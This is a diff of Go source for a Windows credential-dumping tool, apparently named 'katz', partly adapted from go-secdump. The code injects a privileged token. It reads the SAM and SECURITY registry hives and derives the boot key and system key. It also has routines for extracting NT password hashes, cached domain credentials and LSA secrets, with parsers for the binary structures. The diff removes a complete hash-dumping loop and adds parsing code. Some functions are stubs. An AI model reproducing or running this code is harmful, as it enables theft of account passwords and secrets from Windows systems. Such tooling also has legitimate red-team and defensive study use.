@@ -1,8 +1,9 @@
-package lib
+package sam
 
 import (
 	"bytes"
 	"fmt"
+	"katz/katz/utils"
 
 	"encoding/binary"
 	"encoding/hex"
@@ -10,100 +11,165 @@ import (
 	"golang.org/x/sys/windows"
 
 	"strings"
-	// "log"
+	"log"
 	"strconv"
 
 	"golang.org/x/sys/windows/registry"
 )
 
+// lots of code used from: https://github.com/jfjallid/go-secdump.git
 
-func TestRegAccess(token windows.Token) error {
-	err := InjectToken(token)
-	if err != nil {
-		return err
+type domain_account_f struct { // 104 bytes of fixed length fields
+	Revision                     uint16
+	_                            uint32 // Unknown
+	_                            uint16 // Unknown
+	CreationTime                 uint64
+	DomainModifiedAccount        uint64
+	MaxPasswordAge               uint64
+	MinPasswordAge               uint64
+	ForceLogoff                  uint64
+	LockoutDuration              uint64
+	LockoutObservationWindow     uint64
+	ModifiedCountAtLastPromotion uint64
+	NextRid                      uint32
+	PasswordProperties           uint32
+	MinPasswordLength            uint16
+	PasswordHistoryLength        uint16
+	LockoutThreshold             uint16
+	_                            uint16 // Unknown
+	ServerState                  uint32
+	ServerRole                   uint32
+	UasCompatibilityRequired     uint32
+	_                            uint32 // Unknown
+	Data                         []byte
+}
+func (self *domain_account_f) unmarshal(data []byte) (err error) {
+	if len(data) < 104 {
+		err = fmt.Errorf("Not enough data to unmarshal a DOMAIN_ACCOUNT_F")
+		log.Fatalln(err)
+		return
 	}
-	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion`, registry.READ)
-	defer  key.Close()
 
-	_, _, err = key.GetStringValue("ProgramFilesDir")
-	if err != nil {
-		return err
+	self.Revision = binary.LittleEndian.Uint16(data[:2])
+	self.CreationTime = binary.LittleEndian.Uint64(data[8:16])
+	self.DomainModifiedAccount = binary.LittleEndian.Uint64(data[16:24])
+	self.MaxPasswordAge = binary.LittleEndian.Uint64(data[24:32])
+	self.MinPasswordAge = binary.LittleEndian.Uint64(data[32:40])
+	self.ForceLogoff = binary.LittleEndian.Uint64(data[40:48])
+	self.LockoutDuration = binary.LittleEndian.Uint64(data[48:56])
+	self.LockoutObservationWindow = binary.LittleEndian.Uint64(data[56:64])
+	self.ModifiedCountAtLastPromotion = binary.LittleEndian.Uint64(data[64:72])
+	self.NextRid = binary.LittleEndian.Uint32(data[72:76])
+	self.PasswordProperties = binary.LittleEndian.Uint32(data[76:80])
+	self.MinPasswordLength = binary.LittleEndian.Uint16(data[80:82])
+	self.PasswordHistoryLength = binary.LittleEndian.Uint16(data[82:84])
+	self.LockoutThreshold = binary.LittleEndian.Uint16(data[84:86])
+	self.ServerState = binary.LittleEndian.Uint32(data[88:92])
+	self.ServerRole = binary.LittleEndian.Uint32(data[92:96])
+	self.UasCompatibilityRequired = binary.LittleEndian.Uint32(data[96:100])
+	if len(data) > 104 {
+		self.Data = make([]byte, len(data[104:]))
+		copy(self.Data, data[104:])
 	}
-	return nil
+	return
+}
+type sam_key_data_aes struct {
+	Revision    uint32
+	Length      uint32
+	ChecksumLen uint32
+	DataLen     uint32
+	Salt        [16]byte
+	Data        [32]byte
+}
+type sam_key_data struct {
+	Revision uint32
+	Length   uint32
+	Salt     [16]byte
+	Key      [16]byte
+	Checksum [16]byte
+	_        uint64
+}
+type Sam_account struct {
+	Name   string
+	Rid    uint32
+	Nthash string
 }
 
-func DumpSAM(token windows.Token) ([]*sam_account, error) {
-	var acc []*sam_account
-	err := InjectToken(token)
-	if err != nil {
-		return acc, err
-	}
-	
-	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SAM\SAM\Domains\Account\Users`, registry.READ)
-	if err != nil {
-		return acc, fmt.Errorf("failed to open Users key: %w", err)
-	}
-	defer key.Close()
-
-	subKeys, err := key.ReadSubKeyNames(-1)
-	if err != nil {
-		return acc, fmt.Errorf("failed to read subkeys: %w", err)
-	}
-
-	bootKey, err := GetBootKey(token)
-	if err != nil {
-		return acc, fmt.Errorf("failed to get boot key: %w", err)
-	}
-
-	systemKey, err := GetSysKey(token, bootKey)
-	if err != nil {
-		return acc, fmt.Errorf("failed to get system key: %w", err)
-	}
-
-	for _, k := range subKeys {
-		// Skip non-RID keys (like "Names")
-		if len(k) != 8 {
-			continue
-		}
-
-		// Parse RID from the key name
-		rid, err := parseRIDFromKey(k)
-		if err != nil {
-			continue // Skip invalid RIDs
-		}
-
-		subKeyPath := fmt.Sprintf(`SAM\SAM\Domains\Account\Users\%s`, k)
-		subKey, err := registry.OpenKey(registry.LOCAL_MACHINE, subKeyPath, registry.READ)
-		if err != nil {
-			continue
-		}
-		defer subKey.Close()
-
-		subKeyData, err := subKey.ReadValueNames(-1)
-		if err != nil {
-			continue
-		}
-
-		// Check if this is a valid user entry (should have "V" value)
-		if len(subKeyData) > 1 {
-			v, _, err := subKey.GetBinaryValue("V")
-			if err != nil {
-				continue
-			}
-
-			data := GetNT(v, rid, systemKey)
-			acc = append(acc, &data)
-		}
-	}
-	result, err := GetCachedHash(token, bootKey)
-	fmt.Println(result)
-	getServiceUser(token)
-
-	return acc, nil
+type UserCreds struct {
+	Username string
+	Data     []byte
+	IV       []byte
+	RID      uint32
+	AES      bool
 }
+// https://www.passcape.com/index.php?section=docsys&cmd=details&id=23
+type lsa_secret struct {
+	Version       uint32
+	EncKeyId      string // 16 bytes
+	EncAlgorithm  uint32
+	Flags         uint32
+	EncryptedData []byte
+}
+func parseSecret(){}
+
+
+func getServiceUser(token windows.Token) (result string, err error){
+	err = utils.InjectToken(token) // inject token
+    if err != nil {
+        return "", fmt.Errorf("failed to inject token: %w", err)
+    }
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\`, registry.READ)
+	fmt.Println(key.ReadSubKeyNames(-1))
+	return "",nil
+}
+
+func (self *lsa_secret) unmarshal(data []byte) error {
+    // Need at least 28 bytes for the fixed-size fields
+    if len(data) < 28 {
+        return fmt.Errorf("insufficient data length for lsa_secret: got %d bytes, need at least 28", len(data))
+    }
+
+    self.Version = binary.LittleEndian.Uint32(data[:4])
+    self.EncKeyId = string(data[4:20])
+    self.EncAlgorithm = binary.LittleEndian.Uint32(data[20:24])
+    self.Flags = binary.LittleEndian.Uint32(data[24:28])
+    
+    // Set encrypted data if there's any data remaining
+    if len(data) > 28 {
+        self.EncryptedData = data[28:]
+    } else {
+        self.EncryptedData = []byte{}
+    }
+    return nil
+}
+
+type lsa_secret_blob struct {
+    Length  uint32
+    Unknown [12]byte
+    Secret  []byte
+}
+
+func (self *lsa_secret_blob) unmarshal(data []byte) error {
+    // Need at least 16 bytes for the header (4 bytes Length + 12 bytes Unknown)
+    if len(data) < 16 {
+        return fmt.Errorf("insufficient data length for lsa_secret_blob: got %d bytes, need at least 16", len(data))
+    }
+
+    self.Length = binary.LittleEndian.Uint32(data[:4])
+    copy(self.Unknown[:], data[4:16])
+
+    // Check if we have enough data for the secret
+    if len(data) < 16+int(self.Length) {
+        return fmt.Errorf("insufficient data length for secret: got %d bytes, need %d", len(data)-16, self.Length)
+    }
+
+    self.Secret = data[16 : 16+self.Length]
+    return nil
+}
+
 
 // parseRIDFromKey extracts the RID from a registry key name
-func parseRIDFromKey(keyName string) (uint32, error) {
+func ParseRIDFromKey(keyName string) (uint32, error) {
 	// Registry key names for user accounts are stored as hex strings
 	// Remove any leading/trailing whitespace
 	keyName = strings.TrimSpace(keyName)
@@ -123,7 +189,7 @@ func parseRIDFromKey(keyName string) (uint32, error) {
 }
 
 func GetCachedHash(token windows.Token, bootkey []byte) (result []string, err error) {
-    err = InjectToken(token) // inject token
+    err = utils.InjectToken(token) // inject token
     if err != nil {
         return nil, fmt.Errorf("failed to inject token: %w", err)
     }
@@ -201,7 +267,7 @@ func GetCachedHash(token windows.Token, bootkey []byte) (result []string, err er
 }
 
 func GetLSASecretkey(token windows.Token, bootkey []byte) (result []byte, err error) {
-    err = InjectToken(token) // inject token
+    err = utils.InjectToken(token) // inject token
     if err != nil {
         return nil, fmt.Errorf("failed to inject token: %w", err)
     }
@@ -225,7 +291,7 @@ func GetLSASecretkey(token windows.Token, bootkey []byte) (result []byte, err er
     return result, nil
 }
 func GetLSASecrets(token windows.Token, bootKey,lsaKey []byte) (secrets []string, err error) {
-	err = InjectToken(token) // inject token
+	err = utils.InjectToken(token) // inject token
     if err != nil {
         return nil, fmt.Errorf("failed to inject token: %w", err)
     }
@@ -277,7 +343,7 @@ func GetLSASecrets(token windows.Token, bootKey,lsaKey []byte) (secrets []string
 
 
 func GetBootKey(token windows.Token) (result []byte, err error) {
-	err = InjectToken(token) // inject token
+	err = utils.InjectToken(token) // inject token
 	if err != nil {
 		return nil, err
 	}
@@ -374,7 +440,7 @@ func GetBootKey(token windows.Token) (result []byte, err error) {
 	return bootKey, nil
 }
 func GetSysKey(token windows.Token, bootKey []byte) ([]byte, error){
-	err := InjectToken(token) // inject token
+	err := utils.InjectToken(token) // inject token
 	if err != nil {
 		return nil,err
 	}
